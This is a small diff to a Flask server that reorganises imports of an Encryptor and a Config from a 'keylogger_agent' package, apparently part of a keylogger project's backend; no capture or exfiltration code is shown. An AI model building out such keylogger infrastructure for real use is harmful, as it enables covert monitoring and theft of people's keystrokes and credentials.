@@ -1,7 +1,9 @@
 from flask import Flask, request, jsonify
+import sys
 import os
-from key_logger.keylogger_agent.encryption import Encryptor
-from key_logger.keylogger_agent.config import Config
+sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
+from keylogger_agent.encryption import Encryptor
+from keylogger_agent.config import Config
 from datetime import datetime
 from flask_cors import CORS
 
